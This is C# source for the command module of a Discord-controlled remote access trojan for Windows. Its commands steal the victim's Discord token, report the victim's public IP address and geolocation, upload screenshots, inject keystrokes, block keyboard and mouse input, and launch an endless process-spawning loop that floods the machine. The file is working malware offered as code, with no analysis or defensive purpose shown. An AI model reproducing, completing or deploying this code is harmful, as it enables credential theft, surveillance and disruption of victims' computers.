namespace Zeuratis;

[SupportedOSPlatform("windows")]
public class MiscCommands : ModuleBase<SocketCommandContext>
{
    private static bool s_isBlocked = false;

    [Command("GetIp")]
    public async Task GetIp()
    {
        await ReplyAsync(Net.GetPublicIP().Result);
    }

    [Command("GetDiscToken")]
    public async Task GetDiscToken()
    {
        await ReplyAsync($"```{Discord.GetToken()}```");
    }

    [Command("GetGeoInfo")]
    public async Task GetGeo()
    {
        GeoInfo geo = new GeoLocator().GetAll();

        await ReplyAsync(embed: new EmbedBuilder()
        {
            Timestamp = DateTime.Now
        }
        .AddField("**Country: **", geo.Country)
        .AddField("**RegionName: **", geo.RegionName)
        .AddField("**Region: **", geo.Region)
        .AddField("**City: **", geo.City)
        .AddField("**CountryCode: **", geo.CountryCode)
        .AddField("**Zip: **", geo.Zip)
        .AddField("**Timezone: **", geo.Timezone)
        .AddField("**Lat: **", geo.Lat)
        .AddField("**Lon: **", geo.Lon)
        .Build());
    }

    [Command("SearchUrlInBrowser")]
    public async Task PlayInBrowser(String url)
    {   
        Process.Start(@"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", url);

        await ReplyAsync($"``{url}`` has been opened in their browser");    
    }

    [Command("GetScreen")]
    public async Task GetScreen()
    {
        await Context.Channel.SendFileAsync(Display.Capture());
    }

    [Command("MsgBox")]
    public async Task MsgBox(String description, String type)
    {
        MessageBoxIcon icon;

        if (type == "error")
            icon = MessageBoxIcon.Error;
        else if (type == "warning")
            icon = MessageBoxIcon.Warning;
        else if (type == "question")
            icon = MessageBoxIcon.Question;
        else if (type == "exclamation")
            icon = MessageBoxIcon.Exclamation;
        else
            icon = MessageBoxIcon.Information;

        MessageBox.Show(description, type, MessageBoxButtons.OK, icon);

        await ReplyAsync("MsgBox shown");
    }

    [Command("SendKeys")]
    public async Task SendKeyPress(String keys)
    {
        SendKeys.SendWait(keys);

        await ReplyAsync("Keys Sent");
    }

    [Command("SetWallPaper")]
    public async Task SetWallPaper(String filePath)
    {
        if (File.Exists(filePath))
        {
            _ = Native.SystemParametersInfo(0x0014, 0, Path.GetFullPath(filePath), 0x0001);
            await ReplyAsync("Set Wall Paper");
        }
        else
        {
            await ReplyAsync("File Dont Exist");
        }
    }

    [Command("BlockInput")]
    public async Task BlockInputCmd(int secTime)
    {
        if (!s_isBlocked)
        {
            s_isBlocked = true;

            Thread thrd = new(() => BlockInput(secTime));
            thrd.Start();

            await ReplyAsync("Blocked Input");
        }
        else
        {
            await ReplyAsync("PC is already blocked");
        }
    }

    [Command("PCFucker")]
    public async Task PCFucker()
    {
        List<String> procList = new()
        {
            "notepad",
            "explorer",
            "mspaint",
            "calc",
            "cmd"
        };

        Thread thrd = new(() =>
        {
            while (true)
            {
                foreach (String proc in procList)
                {
                    Process.Start(proc);
                    Process.Start(@"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe", "https://www.youtube.com/watch?v=dQw4w9WgXcQ");
                }
            }
        });
        thrd.Start();

        await ReplyAsync("PC is getting fucked");
    }

    [Command("SetVolume")]
    public async Task SetVolume(int volume)
    {
        CoreAudioDevice defaultPlaybackDevice = new CoreAudioController().DefaultPlaybackDevice;
        defaultPlaybackDevice.Volume = volume;

        await ReplyAsync("Set Volume");
    }

    public static void BlockInput(int time)
    {
        Native.BlockInput(true);
        Thread.Sleep(time * 1000);
        Native.BlockInput(false);
        s_isBlocked = false;
    }
}
